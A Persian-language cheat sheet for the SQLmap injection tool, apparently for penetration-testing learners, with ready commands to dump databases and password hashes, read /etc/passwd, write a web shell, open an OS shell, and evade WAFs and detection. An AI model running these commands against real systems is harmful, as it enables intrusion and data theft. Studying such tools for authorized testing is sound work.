🗄️ چیت‌شیت جامع SQLmap

🔰 مقدمه – SQLmap چیست؟

SQLmap یک ابزار متن‌باز و قدرتمند برای تشخیص و بهره‌برداری خودکار از آسیب‌پذیری‌های تزریق SQL (SQL Injection) است. این ابزار که به زبان Python نوشته شده، به متخصصان امنیت امکان می‌دهد تا به‌صورت خودکار و کارآمد، آسیب‌پذیری‌های SQLi را شناسایی کرده و داده‌های حساس را از پایگاه داده استخراج کنند.

SQLmap از انواع مختلف SQL Injection (مانند Boolean-based Blind، Time-based Blind، Error-based، UNION-based و Out-of-band) پشتیبانی می‌کند و با بیش از ۳۰ نوع پایگاه داده (MySQL، PostgreSQL، Oracle، MSSQL، SQLite و …) سازگار است.

💡 کاربردهای اصلی SQLmap:
  • تشخیص خودکار: شناسایی خودکار آسیب‌پذیری‌های SQL Injection.
  • استخراج داده: دریافت نام پایگاه‌های داده، جداول، ستون‌ها و داده‌های آنها.
  • بهره‌برداری پیشرفته: دریافت شل سیستمی (OS Shell)، خواندن/نوشتن فایل‌ها و اجرای دستورات.
  • دور زدن WAF: استفاده از تکنیک‌های پیشرفته برای عبور از فایروال‌های برنامه‌های وب.
  • Brute-Force: انجام حملات Brute-Force برای پیدا کردن جداول و ستون‌ها.
  • حملات به کوکی‌ها و هدرها: تست SQL Injection در کوکی‌ها، هدرها و پارامترهای مختلف.
⚠️ هشدار اخلاقی: SQLmap یک ابزار بسیار قدرتمند است. استفاده از آن برای حمله به سیستم‌های بدون مجوز، جرم محسوب می‌شود. فقط در محیط‌های آزمایشگاهی و با مجوز استفاده شود.

📥 نصب و راه‌اندازی SQLmap

📌 نصب در Kali Linux (پیش‌فرض):

SQLmap در Kali Linux به صورت پیش‌فرض نصب است.

sudo apt update
sudo apt install sqlmap -y

📌 نصب از مخزن GitHub (آخرین نسخه):

git clone --depth 1 https://github.com/sqlmapproject/sqlmap.git
cd sqlmap
python3 sqlmap.py --version

📌 نصب در ویندوز:

دانلود از: https://sqlmap.org/

📌 بررسی نصب و نسخه:

sqlmap --version
💡 نکته: برای استفاده از SQLmap، به Python 3 نیاز دارید. در Kali Linux، Python 3 به صورت پیش‌فرض نصب است.

⚙️ گزینه‌های پایه SQLmap

گزینهتوضیحمثال
-u یا --url URL هدف sqlmap -u "http://target.com/page.php?id=1"
--data داده‌های POST sqlmap -u "http://target.com/login.php" --data="user=admin&pass=123"
--cookie ارسال کوکی sqlmap -u "http://target.com/profile.php" --cookie="PHPSESSID=abc123"
--headers ارسال هدرهای سفارشی sqlmap -u "http://target.com/api.php" --headers="User-Agent: Mozilla/5.0"
--method روش HTTP (GET/POST/PUT/DELETE) sqlmap -u "http://target.com/api.php" --method=PUT
--level سطح اسکن (۱-۵، پیش‌فرض ۱) sqlmap -u "http://target.com/page.php?id=1" --level=3
--risk ریسک اسکن (۱-۳، پیش‌فرض ۱) sqlmap -u "http://target.com/page.php?id=1" --risk=2
--threads تعداد تردهای موازی sqlmap -u "http://target.com/page.php?id=1" --threads=10
--batch حالت خودکار (بدون سوال) sqlmap -u "http://target.com/page.php?id=1" --batch
-v سطح جزئیات (۰-۶، پیش‌فرض ۱) sqlmap -u "http://target.com/page.php?id=1" -v 3
--random-agent استفاده از User-Agent تصادفی sqlmap -u "http://target.com/page.php?id=1" --random-agent
--delay تأخیر بین درخواست‌ها (ثانیه) sqlmap -u "http://target.com/page.php?id=1" --delay=2
💡 نکته: گزینه‌های --level و --risk برای اسکن عمیق‌تر و شناسایی آسیب‌پذیری‌های پیچیده‌تر استفاده می‌شوند. سطح بالاتر ممکن است باعث ایجاد ترافیک سنگین شود.

🔍 تشخیص و شناسایی با SQLmap

# تشخیص خودکار SQL Injection
sqlmap -u "http://target.com/page.php?id=1"

# تشخیص با کوکی
sqlmap -u "http://target.com/profile.php" --cookie="PHPSESSID=abc123"

# تشخیص با داده‌های POST
sqlmap -u "http://target.com/login.php" --data="user=admin&pass=123"

# اسکن با سطح و ریسک بالاتر
sqlmap -u "http://target.com/page.php?id=1" --level=3 --risk=2

# تشخیص با تکنیک خاص (مثال: Time-based Blind)
sqlmap -u "http://target.com/page.php?id=1" --technique=T

# تشخیص تمام تکنیک‌ها
sqlmap -u "http://target.com/page.php?id=1" --technique=BEUSTQ
💡 تکنیک‌های پشتیبانی‌شده:
  • B: Boolean-based Blind
  • E: Error-based
  • U: UNION-based
  • S: Stacked Queries
  • T: Time-based Blind
  • Q: Inline Queries

📊 استخراج داده با SQLmap

# لیست پایگاه‌های داده
sqlmap -u "http://target.com/page.php?id=1" --dbs

# استفاده از پایگاه داده خاص
sqlmap -u "http://target.com/page.php?id=1" -D database_name

# لیست جداول یک پایگاه داده
sqlmap -u "http://target.com/page.php?id=1" -D database_name --tables

# لیست ستون‌های یک جدول
sqlmap -u "http://target.com/page.php?id=1" -D database_name -T table_name --columns

# استخراج داده از یک جدول
sqlmap -u "http://target.com/page.php?id=1" -D database_name -T users --dump

# استخراج ستون‌های خاص
sqlmap -u "http://target.com/page.php?id=1" -D database_name -T users -C username,password --dump

# استخراج با محدودیت (۱۰ رکورد اول)
sqlmap -u "http://target.com/page.php?id=1" -D database_name -T users --dump --stop=10

📌 استخراج اطلاعات با SQLmap (پیشرفته):

# استخراج نام کاربری پایگاه داده
sqlmap -u "http://target.com/page.php?id=1" --current-user

# استخراج نام پایگاه داده فعلی
sqlmap -u "http://target.com/page.php?id=1" --current-db

# استخراج تمام کاربران پایگاه داده
sqlmap -u "http://target.com/page.php?id=1" --users

# استخراج رمزهای عبور هش‌شده
sqlmap -u "http://target.com/page.php?id=1" --passwords

# استخراج نقش‌ها و مجوزها
sqlmap -u "http://target.com/page.php?id=1" --privileges
⚠️ هشدار: استخراج داده‌های حساس بدون مجوز جرم است. فقط در محیط‌های آزمایشگاهی و با مجوز انجام دهید.

🚀 تکنیک‌های پیشرفته SQLmap

📌 ۱. اجرای دستورات سیستم (OS Shell)

# دریافت شل سیستمی (در صورت وجود آسیب‌پذیری)
sqlmap -u "http://target.com/page.php?id=1" --os-shell

# اجرای یک دستور خاص
sqlmap -u "http://target.com/page.php?id=1" --os-cmd="id"

📌 ۲. خواندن و نوشتن فایل‌ها

# خواندن فایل از سرور (نیاز به دسترسی FILE)
sqlmap -u "http://target.com/page.php?id=1" --file-read="/etc/passwd"

# نوشتن فایل روی سرور
sqlmap -u "http://target.com/page.php?id=1" --file-write="/path/to/shell.php" --file-dest="/var/www/html/shell.php"

📌 ۳. دور زدن WAF و فیلترها (WAF Bypass)

# استفاده از User-Agent تصادفی
sqlmap -u "http://target.com/page.php?id=1" --random-agent

# استفاده از تکنیک‌های Bypass
sqlmap -u "http://target.com/page.php?id=1" --tamper=space2comment

# چندین Tamper با هم
sqlmap -u "http://target.com/page.php?id=1" --tamper=space2comment,between,randomcase

# لیست تمام Tamperها
sqlmap --list-tampers
💡 نکته: Tamperها اسکریپت‌هایی هستند که برای دور زدن فیلترها و WAF استفاده می‌شوند. برخی از معروف‌ترین Tamperها عبارتند از:
  • space2comment: تبدیل فاصله به کامنت‌های SQL
  • between: جایگزینی AND با BETWEEN
  • randomcase: تغییر تصادفی حروف بزرگ/کوچک
  • chardoubleencode: کدگذاری دوگانه کاراکترها

📌 ۴. حملات به کوکی‌ها و هدرها

# تست SQL Injection در کوکی
sqlmap -u "http://target.com/page.php" --cookie="PHPSESSID=abc123*"

# تست در هدر User-Agent
sqlmap -u "http://target.com/page.php" --headers="User-Agent: test*"

# تست در هدر Referer
sqlmap -u "http://target.com/page.php" --headers="Referer: test*"

📌 ۵. حملات Brute-Force

# Brute-Force نام جداول
sqlmap -u "http://target.com/page.php?id=1" --common-tables

# Brute-Force نام ستون‌ها
sqlmap -u "http://target.com/page.php?id=1" --common-columns

📌 ۶. ادامه و ذخیره نتایج

# ذخیره خروجی در فایل
sqlmap -u "http://target.com/page.php?id=1" --output-dir="/path/to/results"

# ادامه اسکن از نقطه قبلی (Resume)
sqlmap -u "http://target.com/page.php?id=1" --resume

# ذخیره نتایج در فایل CSV
sqlmap -u "http://target.com/page.php?id=1" -D database_name -T users --dump --csv

🧪 سناریوهای عملی با SQLmap

📌 سناریو ۱: اسکن و استخراج داده از DVWA

# اسکن URL با کوکی
sqlmap -u "http://192.168.1.101/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="security=low; PHPSESSID=abc123"

# استخراج پایگاه‌های داده
sqlmap -u "http://192.168.1.101/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="security=low; PHPSESSID=abc123" --dbs

# استخراج جداول پایگاه داده dvwa
sqlmap -u "http://192.168.1.101/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="security=low; PHPSESSID=abc123" -D dvwa --tables

# استخراج داده از جدول users
sqlmap -u "http://192.168.1.101/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="security=low; PHPSESSID=abc123" -D dvwa -T users --dump

📌 سناریو ۲: حمله به یک API با متد POST

sqlmap -u "http://api.target.com/v1/user" --data="id=1&action=view" --method=POST --headers="Authorization: Bearer token123" --batch

📌 سناریو ۳: حمله با تکنیک Time-based Blind

sqlmap -u "http://target.com/page.php?id=1" --technique=T --delay=2 --batch

📌 سناریو ۴: دریافت شل سیستمی

# ابتدا بررسی می‌کنیم که آیا امکان دریافت شل وجود دارد
sqlmap -u "http://target.com/page.php?id=1" --os-shell

# در صورت موفقیت، یک شل تعاملی دریافت می‌کنید

📌 سناریو ۵: دور زدن WAF با Tamper

sqlmap -u "http://target.com/page.php?id=1" --tamper=space2comment,between,randomcase --batch
💡 نکته: ترکیب گزینه‌های --level، --risk و --tamper می‌تواند شانس موفقیت را در محیط‌های با WAF قوی افزایش دهد.

🔒 نکات امنیتی و حرفه‌ای

  • همیشه از کوکی و جلسه صحیح استفاده کنید: برای دسترسی به صفحات نیازمند احراز هویت، کوکی معتبر ارسال کنید.
  • تنظیم --delay برای کاهش بار: در محیط‌های واقعی، از تأخیر بین درخواست‌ها استفاده کنید تا از شناسایی جلوگیری شود.
  • استفاده از --threads با احتیاط: تردهای زیاد ممکن است باعث ایجاد ترافیک سنگین و شناسایی شود.
  • آزمایش با --level و --risk: سطح و ریسک بالاتر ممکن است آسیب‌پذیری‌های بیشتری را شناسایی کند اما زمان بیشتری می‌برد.
  • بررسی نتایج: همیشه نتایج اسکن را به‌دقت بررسی کنید تا از مثبت کاذب جلوگیری شود.
  • استفاده از --batch: برای خودکارسازی کامل و جلوگیری از توقف به دلیل سوالات.
  • به‌روزرسانی منظم: SQLmap را به‌روز نگه دارید تا از آخرین payloadها و تکنیک‌ها بهره‌مند شوید.
  • آزمایش در محیط‌های مجاز: از SQLmap فقط در محیط‌های مجاز استفاده کنید.
⚠️ هشدار اخلاقی: استفاده از SQLmap برای حمله به سیستم‌های بدون مجوز جرم است. همیشه قبل از تست، مجوز کتبی دریافت کنید.

📖 واژه‌نامه تخصصی SQLmap

واژهتوضیح کامل
SQL Injection آسیب‌پذیری‌ای که در آن مهاجم کد SQL مخرب را به ورودی‌های برنامه تزریق می‌کند.
Boolean-based Blind نوعی SQL Injection که در آن مهاجم با ارسال شرط‌های True/False، اطلاعات را استخراج می‌کند.
Time-based Blind نوعی SQL Injection که در آن مهاجم با استفاده از تأخیر زمانی (SLEEP) اطلاعات را استخراج می‌کند.
Error-based نوعی SQL Injection که در آن مهاجم از پیام‌های خطای پایگاه داده برای استخراج اطلاعات استفاده می‌کند.
UNION-based نوعی SQL Injection که در آن مهاجم از دستور UNION برای ترکیب نتایج کوئری‌ها استفاده می‌کند.
Out-of-band نوعی SQL Injection که در آن مهاجم از کانال دیگری (مثل DNS یا HTTP) برای دریافت داده استفاده می‌کند.
Payload کد یا داده‌ای که برای بهره‌برداری از آسیب‌پذیری تزریق می‌شود.
Tamper اسکریپتی که برای تغییر Payload و دور زدن فیلترها و WAF استفاده می‌شود.
WAF Web Application Firewall – سیستمی که از برنامه‌های وب در برابر حملات محافظت می‌کند.
OS Shell دسترسی به خط فرمان سیستم‌عامل هدف که از طریق SQL Injection به دست می‌آید.
Database Schema ساختار پایگاه داده شامل جداول، ستون‌ها، و روابط بین آنها.
Brute-Force حمل‌های که در آن با امتحان ترکیب‌های مختلف، سعی در یافتن اطلاعات (مثل نام جداول) می‌کند.
sqlmap ابزاری خودکار برای تشخیص و بهره‌برداری از آسیب‌پذیری‌های SQL Injection.
💡 جمع‌بندی چیت‌شیت SQLmap:

SQLmap یکی از قدرتمندترین ابزارهای تشخیص و بهره‌برداری از SQL Injection است که با قابلیت‌های پیشرفته‌ای مانند OS Shell، WAF Bypass و استخراج خودکار داده، به متخصصان امنیت امکان ارزیابی عمیق برنامه‌های وب را می‌دهد.

📌 توصیه نهایی: با گزینه‌های پایه شروع کنید و سپس به سراغ تکنیک‌های پیشرفته بروید. همیشه از گزینه‌های --batch و --random-agent برای خودکارسازی و کاهش شناسایی استفاده کنید. تمرین روی محیط‌های آزمایشگاهی مانند DVWA بهترین راه برای یادگیری است.
